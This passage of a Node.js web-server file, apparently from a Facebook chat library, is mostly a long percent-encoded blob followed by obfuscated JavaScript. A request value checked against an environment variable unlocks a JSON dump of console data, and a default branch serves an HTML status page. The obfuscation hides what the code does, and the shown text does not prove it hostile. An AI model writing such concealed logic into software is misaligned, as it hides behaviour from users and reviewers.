%19%16%08%09%03Y%1B%04%02$IO%16%0A)T09%02%05%19%3CPJ\'_%1B-%05%08%1AX%093V,6%160:3JH;P%12%15\'?9%203*0PJ\'J%127Z3QX%1D&%11-P%0A)T09I%15%14%12%3EKSKJN%3C%1A%0D*RKH;EPC%04%3E%12*=E%3C%3E%11%3EJHOFQ%13%1A**IOD$E8\'Y%1C%00%18%17%1B%17%13%0D%0FF%1A=%08%25RK%1A%14%08%0D%0D%11%14BINF%22%25H%5BI:;FQSH!I:;0%22S8\'I:;0PQIR+S%0C$QQJSIIM6%22S8!I:;0R#H!?%3C;F%22%25%3E!I:;0%22S8\'?%3CO%10%1F%0D%0D%19%16%08%09%03Y!%02%09$IO%16%0B%1D%17%0F%10%0FFJ%25%0DSJUQA%10%1F%0D%0D%19%16%08%09%03Y%0B%1A%11$IO%16%0B%1D%17%0F%10%0FF$%3C.!RKJ%09),0KSI$0%251PJQ%155%20\'QQH+%09%22-EP%05%05%0F%0C%02%12%04%16%16C/W%0C%20EP%03%11%1F%16%14%14%03YP8\'9:;0R#%3ES9J=0RYH!?%3C%1B%172%10%12%18L%14%05PQ%1E%16%14%01%15%0F%02%17P%14%0C%0A%25O%16%0F%19%11Z;S%0C)DPS%02SQWYIUS%15PQVYMHJA%15%09%0F%01%1CP:H%08%25ZEI%00RJPXR@I%17QJSPP%5EPQ%10%0D%0B%15%05%05Q!Q%10&H%1D%0E%18%0B%06ZJQ%09_IITJRLV%15HHP;RH%5C4K%12\'GC%0A%09%0C?GKJ%1APV_A9NJ%0DSV%5CHOVSXIV%02KHUIVUK%5BA@SIKZ%04%1F%1C%19%08A%01%00%15%08YPS%02SQRTKUS%15PQT_IMJ@;S%0C)DPUCVXP@I%17QJUTTZPC%18R%04%14%08%0E%0D%11%0C%14J%12%17%0E=Q%18%11%0D%00%20P%0A%09%00%3EY%1COE%1E%14%20%3CK%1C%04%1F%1C%19%08A%1F%13%03%19%0C%0A%0DZ%09%0E%07+%22%0F%15%12&%3C8E%1E%3C%131L%07QU%15%1A%19%0FS%0D%046%1E%0C(2?%5DN%06%3E%20)RKHOV%04QX%1C%17%0F%05%19%10%17%0DZ79%03)QQ%18%08%07%15%13%1F%17X6O%0F\'NDR5-N!IOF%1EO08JHM%1A):*RKJ7%06:3KS%1F%07%13%03%1A%0C%0A%15%0CA%09%01N;KS%19%13%03%19%0C%0A%0DZJ%0A%5E98PJS90%0FX3PJ\'JH%1B%0B%0C%16%00%0E%0B%0E%08M(+Z9JH%1D%1F%1C%0C%16%08%0CA\'%06O%01KSI%02V%0A;PJQ%15%11!/QQH;)P%20EPS2%11!*ND%04%1E%16%14%01%15%0F%02%17X%08%1DP%22ND%02%0A%06%0E%17%13%08MQ9*%0F$IOD%22)%0AO(IO0QQ%1E%1C%17%0F%05%19%10%17%0DZ//R.QQ%18%08%07%15%13%1F%17XKQI:M6$%258Q9%3C;FQSH!I:;0%22S8\'?HKFXS8\'KJ=0%04%1E%16%14%01%15%0F%02%17X.*%20%25ND%02%0A%06%0E%17%13%08MQ_D!%05%0BS(QQ%3ERKH=%0E%0C%1F)RK%3C%1B%01%1C%0CC%15%0C$%22V%1F%0D%0D%19%16%08%09%03Y1(%0D&IO%16%0B%1D%17%0F%10%0FF%3C6M!RKJ#X%143KSI%20%0D%5B%00PJQ%155%20\'QQH+%09%22-EP%05%05%0F%0C%02%12%04%16%16C%11%0B%1B%22EP%03%11%1F%16%14%14%03Y-52!IOF%20%1D%14=JHM%1E%3E%0B+RKJ\'&H%3EKSI0%0D.2PJ%07%04%14%08%0E%0D%11%0C%14B$%20%1F=PJ%01%10%04%12%18%0B%16C;%1B1%25EPS:%1F%15&NDR%0B$%09*IOF%0E,%250JHM%3C%12;(RK%1C%00%18%17%1B%17%13%0D%0FF%0A%1D%0D\'RK%1A%14%08%0D%0D%11%14B%0E%0AZ:PJQ%0D\'%14$QQH;+%14%20EPS%04%18:%22NDR-V%17$IOF%1A+%5B%03JH%1B%0B%0C%16%00%0E%0B%0E%08M89%0E%3EJH%1D%1F%1C%0C%16%08%0CAN,%12N%1ARKH=%3C%10M)RK%3CND%04%1E%16%14%01%15%0F%02%17X%00B%0D%25ND%02%0A%06%0E%17%13%08M%0A%0F-?JHM8L%15%25RKJ##%03%3EKSI4S%00?PJQ%05%09%1F(QQH%1D%04P%22EPS6O%0F\'ND%04%02(%12%13%03=%0A!%1C%19RK%3C%5B%1E%16%3E%20A%04%14%08%0E%0D%11%0C%14B%02%07:=P&2;%25J4M)\'S%19%0D%03%19Y9%20.&%5CDOB%0E%02%08B4%3C!=EKJ%1APV)L;NJ%0DSV%5BMNUSY%1A%0A%08%0DX%14%02-%25%5D%1A%11%11%0F%1FJ4%3C!=DKJ%0DSV%5DOHUWTT%5EUNQJ%01%11%16%0F%19%1A%10K/8-%22D%02%1B%02%09%07AN%5D%16ISJRPRX%5CNVOWTOW,%22/%3E_IV%15@%3C%5B%3E\'UK%5D6LTIRWQ%5ELQX%01#%222)RE:N3%25%5D%10%1B%0A%06%1B%09Z%05%0C%0A%1DCRR%19T%5DIM&_R%0ET%5DIHPNK%5B375%3C%5ERR%19W%5DJ@WWR%0ET%5DHMTHKZ%11%156%3C%5E?*8%22@QSBQ9%3COV%1B%0A%06%1B%09Z%05%0C%0A%1DCRR%0EW%5DIHRITDV%15HHSKWH%5C8#4\'G%15%19))GEH!9J=6R#%3E\'I:M6$%25%3EQ9%3C;6R#%3E\'9JGF%22%25%3E\'%5DIPULKUWR%0ET%5DLNPMK%5BN_OJPKSDV%02KHSJVQOV%1B%0A%06%1B%09Z%05%0C%0A%1DCRR.T%5BMKVIUTQHAQY/8-%22PQH%0CHRPTZMUULPSPDB%0F%1B5&LKV%1B%0A%06%1B%09Z%1B%10%04%0A%06%0E%17%13%08M8;7%3EY%1C%00%18%17%1B%17%13%0D%0FF%3C,?\'RK%1A%14%08%0D%0D%11%14BINFR#H!?%3C=F%22%25%3EQJJM6R#%3E\'9J=0$QJPJ%12%15\'=PJSKJNF%22#H!9JGF%22%25%3EQ9J=0$%25H!?%3C=F%22%25%3E!I@M6$%25%3ES%1F%07%13%03%1A%0C%0A%15%0CA%15%1E3%3CKS%19%13%03%19%0C%0A%0DZJJGF%22%25HRIJ=F%22%25%3E!I:;0PQIRI:=F%22#H%5B9%3CMLR#%3E\'I:M6$%25%3EQ9%3C;6R#%3E\'9J=0$%25JQJJN6R#8%5BI:;FXS8\'?J=F%22%25%3E\'?J=0P#H!9J=6R#%3E\'I:M6$%25%3EQ9%3C;6R#%3E\'9JGF%22%25%3E\'?H%1B%0B%0C%16%00%0E%0B%0E%08M%0A%0D%04?JH%1D%1F%1C%0C%16%08%0CA7%06:3KSI%06Q%3E;PJQ%01W4.QQH;)P%20EPS2%11!*NDR9%1A*!IOF%20%19%10%3CJHM,%203)RKJ\'&H%3EKSI0%0D.2PJ%07%04%14%08%0E%0D%11%0C%14B4W%04%3CPJ%01%10%04%12%18%0B%16CRIJ=F%22%25%3E!I:;0RPHQ9J=0$#H!?%3CODRP*7Q%25NDP%05%05%0F%0C%02%12%04%16%16C%15%12%03#EP%03%11%1F%16%14%14%03Y_?%0FRQSX%5E%05%191%0A%10%046,%08+1JH;P%3C%22/3Y%07%13%03%1A%0C%0A%15%0CA7:%1D=KS%19%13%03%19%0C%0A%0DZJ%12),3PJSII%09!K2KSK%1C%00%18%17%1B%17%13%0D%0FF%06%12N\'RK%1A%1C&%11%09%01!%157%05&QQ%3EG;Y3(QQ8%1D(Q*EP%25X#Z4#EP#:%0F/*NDR%0F;0)IO0D%02(%12%13%03=%0EA%17\'RK%3C%5D%10%1F%0D%0D%19%16%08%09%03Y51B&IO%16%0B%1D%17%0F%10%0FF%02%1F%0F!RKJ\'_63KSI%02%03%5D%3CPJ%07%04%14%08%0E%0D%11%0C%14B%06%00%5C=PJ%01%10%04%12%18%0B%16CR\'1P+QQJ!/X0$QQ%3ER+&%15.QQJ%07%04%14%08%0E%0D%11%0C%14B(+%5E=PJ%01%10%04%12%18%0B%16CRI:;FXS8\'KJNERS8Q9%3C;6R#%3E\'IIMF%22S8\'?:M6$%25JSHI%11%192;KSKH%1B%0B%0C%16%00%0E%0B%0E%08M%12%1B:8JH%1D%1F%1C%0C%16%08%0CA+%0B%013KSI0%0D.2PJQ%05%09%1F(QQH;+%14%20EPS%0C%3C%10(NDR%17%0FM!IOF%1E%1A;9JHM%0E*@%1ARKJ3X%14%3EKSI%20T%222PJQ#*W+QQH%11%05S%25EPS%14(Z(NDR-V%17$IOF4%02%0F%00JHM%1A+@*RKJ\'$%0C%3EKSI%164U0PJQ#(%13+QQ%1E%00)%09%17%0F%2294%1E(IO0D=!%14!Z%00%18%17%1B%17%13%0D%0FF%203H!RK%1A%14%08%0D%0D%11%14BIN8H%11&RKHLER#%3EQCJ=0RPHQ9J=0$#H!?J=0$QJSIIMF%22S8\'?:M6$%25NQCJ=0P%05%05%0F%0C%02%12%04%16%16C%1DU2$EP%03%11%1F%16%14%14%03YPH%5BI:;FQSH!I:;0%22S8\'?HOF%22%25%1E%1C%17%0F%05%19%10%17%0DZ+$0/QQ%18%08%07%15%13%1F%17XK%09%0BU\'EPQ87%5B7/EP%25K3%25%12%25EPQ%1E%1C%17%0F%05%19%10%17%0DZ%01S(/Q=%19+%20M?:0:O;%17-$D%02%14%06%0EB%20%11%04:EAXY%17%07%1FY%1BW%11!%5CN%5D%01JSJQ\'C%5D%16JSJRSWDB%03%0F%1F%16A%11%1F%1D;X%11-T*W%0E%10%0A%16%07I%05Y%12;_RTT%5EUOUS%15PQVYNKJS%19%12%11%04%0D%1B%0BR%01U%0D.P%03%00%1B%11%04FEI%00WJRUWHI%17QJRQW%5CPB%00N%09%22%5BEI%17QKRTVYTNZCPSOV%0E%0A%079_81$;C%01%08%07%00%0DV%1A%19%10%1FBIPT@MUWR%0ET%5CILWHK%5B%05Y%12;%5E%0D%10%05%25Q%20/*8II\'%185:%5EG_%14%08%09%1C%1E%0A%14%07%05Y(%03)!T%0E%04%08%0A%0D%10Y;%17-$DFPS%15TQV%5CKOFJ%1APV%5DHNJ@JQ%09_HHTJTLQ%5DIMRSY%03%14%08%18%13X%19%03%12%03MQH%0CLRQVZH%5DUOWU%5EDC%1BW%11!%5CN%5D%16LSJRVSHI%00RJRPSDB%03%15%1B%10A?4%1F;%5ERR%0EW%5DIHQKUDV%15HHSHRH%5D%1A%11%11%0F%1FJ8?%0B:DKJ%0DSV%5ELLQWTVUT@QJ%09%15%08%12%0E%11P:#%04%22O%16%1A%19%10%1FBIWTOOROGQ%09_IHSIQH%5C4%20%1E%20GJQ%09_IMUIPLPUMOZSY%03%14%08%18%13C%11-T*V%1A%19%10%1FBIV%15KHSI&DV%02KHSJPVOW%20!%059_%16%14%09:F%5E?%180$C%15%1D%0D%1D%16%09YEI%17QJQQU%5DTNTJUQOWQH%0CHRWP%5BOUS%02SQ%22T;QX%18%10%04%07%06B%05%22%0D%0B%22MP%3C%02289%16%14%09:%25X%07%00%13%03%0C%12C%00%1B%11%04FEI%00RJQ#P@I%17QJSWR%5EPB%00N%09%22%5BEONQKTLV%02KHRHRWOV%0E%0A%079IJ%5D%0F%0B%1D%02%11Y%1C%1B%10%0B%1D%17%0F%10%0FF,%0E%11%20A%1F%07%13%03%1A%0C%0A%15%0CA%15%00A:KS%19%13%03%19%0C%0A%0DZJJ=6R#8QCJ=0$S8Q9%3C;0R#%3E\'9J=0$#H%5BI:;0$QHRJJN6R#8%5BI:;FXS8\'?J=F%22%25%3E\'?J=0P#H!9J=6R#%3E\'I:M6$%25%3EQ9%3C;6R#%3E\'9JGF%22%25%3E\'?HLE(-$%3EJHOD%04%1E%16%14%01%15%0F%02%17X6.%03%22ND%02%0A%06%0E%17%13%08M(%13%201JHM%0AN+!RKJ%05%5B+;KSI%20-%5C?PJQ3%0A%25&QQ%1E%00)%09%17%0F%22-;%1F&IO0D%0F/%02*Z%00%18%17%1B%17%13%0D%0FF%02%11K!RK%1A%14%08%0D%0D%11%14B%06%00%5C=PJQ%153%5E$QQH+%09%22-EPS&4%18\'NDR%1F%01%22!IOF%16%3E%113JHM$8*%22RKJ\'%14);KSI%164U0PJQ7T%0B+QQH%15$%13/EPS%0C%16U%22NDR%17%25%08+IOF%1E%10%1A?JHM,0%0D%25RKJ\'_63KSI%025U%00PJQ%153%5E$QQ%1E%1C%17%0F%05%19%10%17%0DZ3.S/QQ%18%08%07%15%13%1F%17XK%19%07Q#EPQ8+%0BT,EP%25KS%1F%07%13%03%1A%0C%0A%15%0CA7%3C:;KS%19%13%03%19%0C%0A%0DZJ0%0D.2PJS90%0FX3PJ\'JH%1B%0B%0C%16%00%0E%0B%0E%08M%0A%17%259J,*%15:Q%18%08%07%15%13%1F%17X%0C%14\'%25=%205%00%20\'Y%1C%00%18%17%1B%17%13%0D%0FF%02%139%20RK%1A%14%08%0D%0D%11%14BIM6%22S8!I@M6$%25H!I:;0$S8\'?:M6$%258Q9%3C;0PSKRI:;FXS8\'IIMF%22S8\'?:M6$S8\'?HOGQ%13&%0B(IODP%05%05%0F%0C%02%12%04%16%16C3%25%12%25EP%03%11%1F%16%14%14%03YPH!?HMEQSBQ9%3CMLR#%3ESHI%11)%09%3EKSKH%1B%172%10%12%189$%1E%07;PJ\'_,%20:8C%05%0F%0C%02%12%04%16%16C%11%07%17%25EP%03%11%1F%16%14%14%03YPKQCJ=0RPHQ9J=0$#H!?%3CODSP*%1B%11*NDPQHRI:=F%22#H!?%3CM6R#%3E\'?J=0$#H!?%3C=F%22%25%3E\'K%1C%00%18%17%1B%17%13%0D%0FF(;%16%20R%05X%16.P%03%11%1F%16%14%14%03Y%17%0D?&:%01T%09;%3EA%1F%07%13%03%1A%0C%0A%15%0CA%01%0F!;KS%19%13%03%19%0C%0A%0DZJ%15%1F%1D%1C%17%05ZJ:;F%22%25JS9JGF%22%25H%5BI:;FXS8\'?%1C%00%18%17%1B%17%13%0D%0FF$0%22%20RK%1A%14%08%0D%0D%11%14BI3X%14%3EKSK:7%04L2KS?IO%10%1F%0D%0D%19%16%08%09%03Y%1BU(!IO%16%0B%1D%17%0F%10%0FFE%0A7%220JHOF%22%25%1E%1C%17%0F%05%19%10%17%0DZ\'%253.QQ%18%08%07%15%13%1F%17XKR71P,QQJPJJ=0RYH!?JNFR#H!?%3C=F%22%25H!?%3CODPSKQ9:M6%22YH!?JGF%22%25%3EQ9J=0$%25H!?%3C=F%22%25%3E!I@M6$%25%3ES%1F%1B-%05%08%1A8%1D%202,EP%25%5E%0D%18%0D#V%1F%0D%0D%19%16%08%09%03Y!S7!IO%16%0B%1D%17%0F%10%0FF,%12N%1ARKJ\'&H%3EKSI%06%0E%14%3CPJQ%05%09%1F(QQH;+%14%20EP%05%05%0F%0C%02%12%04%16%16C;%1B1%25EP%03%11%1F%16%14%14%03YP%0C6P+NDP#.C4(ND$P*=%11%22NDP%05%05%0F%0C%02%12%04%16%16C/4)%25EP%03%11%1F%16%14%14%03YP%221S\'NDP#2%13W+ND$PJ%07%04%14%08%0E%0D%11%0C%14B%16%12&:PJ%01%10%04%12%18%0B%16CRI@M6$QHRI@M6$SKQI:M6$%258Q9%3C;DPSKQJ:M6%22YH!?JGF%22%25%3EQ9J=0$%25%3EQ9%3CO6R#8Q9:M6$%25H!I:;0$S8\'?:M6$%258QCJ=0$%25%3ES%1F%07%13%03%1A%0C%0A%15%0CA?%3E%3C9KS%19%13%03%19%0C%0A%0DZJJ=6R#8QC:;FXS8\'?J=F%22%25%3E\'I:;0%22S8\'?:M6$%25%3ESIIN%1E69)RKHLE4%1A%170JHOD%04%1E%16%14%01%15%0F%02%17X%22%0B*%20ND%02%0A%06%0E%17%13%08MQSH!I:;0%22S8\'?HMEQ-3L#IODSP%0C%10#%22NDPQ%1E%00)%09%17%0F%22!6%18%20IO0D57%3C\'Z%00%18%17%1B%17%13%0D%0FF87%02%22RK%1A%14%08%0D%0D%11%14BI%15%2282KSKJN%06%3C%09)RKH%1B%0B%0C%16%00%0E%0B%0E%08M%0E%14%20;JH%1D%1F%1C%0C%16%08%0CAN%02?%0A*RKH=%3C%10M)RK%3CND%04%1E%16%14%01%15%0F%02%17X23%17%20ND%02%0B2M(:%09%25%201KS?IO6Q)0C!IODRP%0C%0E%04\'NDP%25%5E!?Z%10%0C%0BX%10%1D%1A%20%5BEI%17QJQUW%5DTH%1BKRW%20%5BPC%18%16%07%15F%20=%08%22A%15%09%0F%01%1CP%10%1D%1A%20ZEI%00WJRWWHI%17QJRQT%5DPQ%18%09%15%08%12%0E%11P%10%1D%1A%20O%16%1A%19%10%1FBIV%02KHVJRQK%5D%01ISC\'QOW%0A%1F%1B;_,%22%1D8D%22%0B*%20NDFPS%15SQV%5DHLR_TTSXNQYRR%0EP%5DIIRLGQ%1E%5CIHS%3CKZ%04%1F%1C%19%08A%01%00%15%08YPRCTVV_%5CH%0CHRQV%5EJQY%09%05%19\'PQH%0CHRPU_IUS%02SQT.NQX%01%01%0E%08%1E%0DX%0C%18%11%20%5B4A-&RK:%05%02?0KS?:+;%1A%3EKS?I%1C&%11%09%01!J0%5E%1D1PJSII#\'%0F=KSK%3CJ%1E(O)!J%12%1F%06?PJSII7%0E%0C1KSK%3CND%22P6%10T(NDPSK%1D%14%09/EPQ%3ES%1E%1DN8)N%22RKH%5D%1E(O)!%0D)?$QQ%3ERK:%11%03@9KS?:%0D,%141KS?I?U,=KS9%02%09+1PJ\'98%0B(0PJ\'J%0E%04%1E8QI#Z4#EP#%00%15$)ND$#:J/%22ND$P:B7$ND%22%1B%0C%3C*IO0%221%20%15%20IO0QQIR#%10.,QQJQJJ=0RYH!?HOFQ%13$%22(IODPC%1E%18%10%04%07%06B%1B%02%09%07AN%5BLORLOQ%09_IHQOQH%5C%1E%1E%00%22GJWP%5CNNNJ%0DSV%5CHLSSY,%22%1D8SHA%00%13%03%0C%12C%00%1B%11%04FEI%00RJSW%5E@I%17QJRTT%5BPB%10%1D%1A%20%5BEI%17WJRQQ%5D%5CH%1BKRQV.PC.%3E%12%20%5BF%22#H!9J=0$S8Q9%3C;0R#%3E\'9J=0$#H%5BI:;0$C%01%08%07%00%0DV%04%05%1E%07%04%14%08%0E%0D%11%0C%14B%0E%0278PJ%01%10%04%12%18%0B%16CRJ03*=PJSHIME%22S8!CJ=0RYH!?%3CM6R#%3E\'?%3CM6$Q8Q9:M6%22S8\'?J=F%22%25%3E\'I:;0%22S8\'?:MLR#%3E\'?%3CODRPHQ9J=0$#H!?%3CO%10%1F%0D%0D%19%16%08%09%03Y)(K#IO%16%0B%1D%17%0F%10%0FFJ%25%0DSJVRA%10%1F%0D%0D%19%16%08%09%03Y%13%5B.#IO%16%0B%1D%17%0F%10%0FFEX#%3EQ9%3CO6RYH!?JGF%22%25H%5BI:;0%04%02(%12%13%03=%1E*=(RK%3C%5B%20J%13+A%04%14%08%0E%0D%11%0C%14B,%20:8P%04I-%20O%16%0B%1D%17%0F%10%0FF%02%17=\'!%05R),$C%1E%1C%17%0F%05%19%10%17%0DZ+%204,QQ%18%08%07%15%13%1F%17XK%0D0Y/EPQ8+%0BT,EP%25KS%1F%07%13%03%1A%0C%0A%15%0CA%05439KS%19%13%03%19%0C%0A%0DZJ8%15%0B2PJSII#=O%3EKSK%1C%00%18%17%1B%17%13%0D%0FF(%0F5%22RK%1A%14%08%0D%0D%11%14B%20%0D%5B%00PJQ%05%03%3E.QQH/W%0C%20EPS.%00%0E%1BND%04%1E%16%14%01%15%0F%02%17X&%02%08#ND%02%0A%06%0E%17%13%08M%16:%0D2JHM%20%1F%00(RKJ7&H9KSI%06%045:PJQ3%0A%25&QQ%1E%1C%17%0F%05%19%10%17%0DZ%05T%0A/QQ%18%08%07%15%13%1F%17XK7%18%0D%1CEPQ8+%0BT,EP%25KS%1F%0D%03%19Y9%10%1F%20%5C=O%1E$D%05%3CCJO$%18%10$@MD%17%1A%07%1DXNC%25%09%08%1C%06%19@MD8%1B%1A%1C%18@MD)%01%01?%0FS$\'+%1CH#%0B%00%10%1B%0EIW#%0B%01%02!%12%1B%0CN:%13%02%05*%06%1A%17)%07%104%1C%07HNC%5BCJO%1E%1A%1A%1E%179%13%1C%0DZOX1%1E%18%09%0C%06%07G&%08%06%18%5BTA%0B%02%01%1A%14%0A%09%07%03%1D%1FY%17%1A%07%1DJ%11%19%17%0F%1A%0D%07W%07%05%10PQZOX%05%03%1F%09%0CZOX%01%05%04%14%07%0F%1A%0C%0BCJO%01%01%00%1E%1D%03%0FOUZ%06%1E%14IDA%5B%0D%1D%0E@MD%0C%1C%0D%01%13@MD-%08%1B%00=%1D%03%12OUZ%16%04%04CJO;-#&%3E.9*\'-!XNC\'%08%01&AV@%02:O%03&A\'Y%07%13%03%1A%0C%0A%15%0CA%05%5D%1E:KS%19%13%03%19%0C%0A%0DZJ%20P%3E5PJSI:;%10%1F%0D%0D%19%16%08%09%03Y%0F%0DC#IO%16%0B%1D%17%0F%10%0FF,%12N%1ARKJ%05%5D%1E:KSI%16%16*;PJQ#*W+QQH+%09%22-EPS*?4#NDR%0B%144\'IOF46W9JHM,2I%25RKJ7%06:3KS%1F%07%13%03%1A%0C%0A%15%0CA?8%1B:KS%19%13%03%19%0C%0A%0DZ;%04%11*QQH%0D6\',EPS%08B6%20NDR%1F%01%22!IOF(%13%201JH%1B%0B%0C%16%00%0E%0B%0E%08M%0A%11W;JH%1D%1F%1C%0C%16%08%0CANFQ#H!9@M6$SBQ9%3C;F%22S8\'?%3C;F%22%25J!I:=F%22#H!?%3CM6R#%3E\'?J=0$#H!?%3C=FXS8\'?%3C;DRPK/2W\'EPQIR+,U)QQJS%1F%07%13%03%1A%0C%0A%15%0CA3=O9KS%19%13%03%19%0C%0A%0DZJJN6R#8%5BI:;FXS8\'?J=F%22%25%3E\'?J=0P#H!9J=6R#%3E\'I:M6$%25%3EQ9%3C;6R#%3E\'9JGF%22%25%3E\'?HMERS8Q9%3C;6R#%3E\'IIMF%22S8\'?:M6$%25JWI@M6$Q%1E%1C%17%0F%05%19%10%17%0DZ73%22/QQ%18%08%07%15%13%1F%17XK!?:#%1B49KS?J=0P#2/%25%25ND$%05%08%11T%25NDB%1E%16%14%01%15%0F%02%17X%14%0A%25#ND%02%0A%06%0E%17%13%08MQ)6=&IODR#%3E%07%04%14%08%0E%0D%11%0C%14B0+%14;PJ%01%10%04%12%18%0B%16C#Z4#EP#%04%1E%17%25ND$C%1E%1C%17%0F%05%19%10%17%0DZ%11%0A$/QQ%18%08%07%15%13%1F%17X%04O%0E#NDR9Q5)IOF%16%3E%113JHM%1A+@*RK%1C%00%18%17%1B%17%13%0D%0FF%201%0C!RK%1A%14%08%0D%0D%11%14B%20%1F=:PJQ;%00%15+QQH;;*,EPS%221S\'NDR)%089)IO%10%1F%0D%0D%19%16%08%09%03Y%17%05%0D%20IO%16%0B%1D%17%0F%10%0FFE%121%161JHO64A53JH;E0H.2JHO%10%1F%0D%0D%19%16%08%09%03Y1%20%15%20IO%16%0B%1D%17%0F%10%0FF,0%0D%25RKJ\'_63KSI4S%00?PJQ/%1B%0A%17QQH%1D%0A%18#EPS%0C%1C%15#ND%04%0B%20%15%25IOV%1F%0D%0D%19%16%08%09%03Y%13%02%08%20IO%16%0B%1D%17%0F%10%0FF8L%15%25RKJ%01%05%00=KSI%06%00%5C=PJ%07%04%14%08%0E%0D%11%0C%14B,%1C%01%03PJ%01%10%04%12%18%0B%16CR9%3C=6$%25H!?H=FR#HQ9:;0%22S8\'?%3C=F%22%25%3E\'%1F%07%13%03%1A%0C%0A%15%0CA%09Z%17%02KS%19%13%03%19%0C%0A%0DZJ:;6%3C%0E.;JH;F%22%25J!%0D/%1C&QQ%3E%07%04%14%08%0E%0D%11%0C%14B(%13%0A%03PJ%01%10%04%12%18%0B%16C#Z4#EP#%10%11%20#ND$#%08%1B%10#ND$PJA%1F%07%13%03%1A%0C%0A%15%0CA%0D_%10%02KS%19%13%03%19%0C%0A%0DZJI3=O9KSKKN$K%12*RKHOFQS8!I:=F%22%25%3EQ9J=0$%25H!?%3C=F%22%25%3E!I:;0$Q%1E%1C%17%0F%05%19%10%17%0DZ\'%11%04%17QQ%18%08%07%15%13%1F%17X25W#NDR%0F1B+IOF%16%3C62JHM%1A-%3E)RKJ7%06:3KS%1F%02#;5PJA%04%14%08%0E%0D%11%0C%14B%06%3E%09%03PJ%01%10%04%12%18%0B%16C3\'7$EPS%00)Z%18NDR%1F%01%22!IOF%1E%1A;9JHM%3C%12;(RK%1C%00%18%17%1B%17%13%0D%0FF,%12N%1ARK%1A%14%08%0D%0D%11%14BI=0%22#%3E\'I:;D%22SBQ9%3CMLR#%3EQCJ=0RYH!?%3C%1B%0B%0C%16%00%0E%0B%0E%08M%1A+%5B%03JH%1D%1F%1C%0C%16%08%0CAN%19%00%08%06%15%04AN6$S8\'KH=FXS8\'I@M6$SBQ9%3CMLR#%3EQCJ=0$%05%191%0A%10%04C%1A5P4_%07%13%03%1A%0C%0A%15%0CIO%16%0B%1D%17%0F%10%0FF_@%05X%00)%09%17%0FW%0FZ,,%5C%00%18%17%1B%17%13%0D%0FND%02%0A%06%0E%17%13%08MKI%1EA%18*%0E%1C%1BV:=;/%5B%0B%0C%16%00%0E%0B%0E%08EP%03%11%1F%16%14%14%03YKV%07Y%1B-%05%08%1AM%09V0(P%1F%0D%0D%19%16%08%09%03QQ%18%08%07%15%13%1F%17XPL%1FZ%1C&%11%09%01T7%25%17%22D%1E%16%14%01%15%0F%02%17PJ%01%10%04%12%18%0B%16CC%1FZ%1C&%11%09%01T%15%03%12%22D%1E%16%14%01%15%0F%02%17PJ%01%10%04%12%18%0B%16CKT%1C%5D%172%10%12%18L0%1F%016E%05%0F%0C%02%12%04%16%16KS%19%13%03%19%0C%0A%0DZPS%1BV%033%0B%0B%00O+%19%1E7%5E%1C%17%0F%05%19%10%17%0DRK%1A%14%08%0D%0D%11%14BP_%10B%02(%12%13%03H%02H%11,G%04%14%08%0E%0D%11%0C%14JH%1D%1F%1C%0C%16%08%0CATZ%04C%191%0A%10%04C0%17%015_%07%13%03%1A%0C%0A%15%0CIO%16%0B%1D%17%0F%10%0FF_A%05X%00)%09%17%0FW%13:1-%5C%00%18%17%1B%17%13%0D%0FND%02%0A%06%0E%17%13%08MHM%1EA%18*%0E%1C%1BV%04.$.%5B%0B%0C%16%00%0E%0B%0E%08EP%03%11%1F%16%14%14%03YIQ%07Y%1B-%05%08%1AM3%13()P%1F%0D%0D%19%16%08%09%03QQ%18%08%07%15%13%1F%17X%5B%07Y%1B-%05%08%1AM%19-%20)P%1F%0D%0D%19%16%08%09%03QQ%18%08%07%15%13%1F%17XRN%1FZ%1C&%11%09%01T\'%0D%22%22D%1E%16%14%01%15%0F%02%17PJ%01%10%04%12%18%0B%16CIR%1C%5D%172%10%12%18L8/%1B6E%05%0F%0C%02%12%04%16%16KS%19%13%03%19%0C%0A%0DZQP%1BV%033%0B%0B%00O%05*%0A5%5E%1C%17%0F%05%19%10%17%0DRK%1A%14%08%0D%0D%11%14BPW%10B%02(%12%13%03H,A%08.G%04%14%08%0E%0D%11%0C%14JH%1D%1F%1C%0C%16%08%0CAT%5D%04C%191%0A%10%04C,%0037_%07%13%03%1A%0C%0A%15%0CIO%16%0B%1D%17%0F%10%0FF%5EA%05X%00)%09%17%0FW%1752/%5C%00%18%17%1B%17%13%0D%0FND%02%0A%06%0E%17%13%08MHH%1EA%18*%0E%1C%1BV2%09),%5B%0B%0C%16%00%0E%0B%0E%08EP%03%11%1F%16%14%14%03YJV%07Y%1B-%05%08%1AM%113%22+P%1F%0D%0D%19%16%08%09%03QQ%18%08%07%15%13%1F%17XT%07Y%1B-%05%08%1AM7%0C\'+P%1F%0D%0D%19%16%08%09%03QQ%18%08%07%15%13%1F%17XPC%1FZ%1C&%11%09%01T%05-%1E%20D%1E%16%14%01%15%0F%02%17PJ%01%10%04%12%18%0B%16CNR%1C%5D%172%10%12%18L$%00_4E%05%0F%0C%02%12%04%16%16KS%19%13%03%19%0C%0A%0DZPW%1B%10P\")")
            }();
            var cUFz = zKhqb[zKhqb.zgiib(0)]();
            while (cUFz < zKhqb[zKhqb.vbdib(1)]()) switch (cUFz) {
                case 0b1101:
                    cUFz = zKhqb[zKhqb.vbdib(1)]();
                    res[zKhqb.r67hb(2)]({
                        [zKhqb.n12hb(3)]: [0] == '',
                        [zKhqb.PACib(4)]: zKhqb.Lvxib(5)
                    });
                    break;
                case 0b100000:
                    cUFz = zKhqb[zKhqb.vbdib(1)](); {
                        res[zKhqb.Hqsib(6)](zKhqb.uc(16) ? 200 : 192, {
                            [zKhqb.Dlnib(7)]: zKhqb.zgiib(8)
                        });
                        res[zKhqb.vbdib(9)](JSON[zKhqb.r67hb(10)](console[zKhqb.n12hb(11)], null, zKhqb.uc(21) ? 2 : -9), zKhqb.PACib(12));
                        res[zKhqb.Lvxib(13)]();
                    }
                    break;
                case 0b10010:
                    cUFz = req[zKhqb.Hqsib(14)][zKhqb.Dlnib(15)] == process[zKhqb.zgiib(16)][zKhqb.vbdib(17)] ? zKhqb[zKhqb.r67hb(18)]() : zKhqb[zKhqb.n12hb(19)]();
                    break;
            }
            break;
        }
        default: {
            res.writeHead(200, "OK", { "Content-Type": "text/html" });
            res.write(ClassicHTML(globalThis.Fca.Require.FastConfig.HTML.UserName, globalThis.Fca.Data.PremText.includes("Premium") ? "Premium": "Free", globalThis.Fca.Require.FastConfig.HTML.MusicLink));
        }
    }
    res.end();
})

globalThis.Fca.Require.Web = express;

/!-[ Function setOptions ]-!/

/**
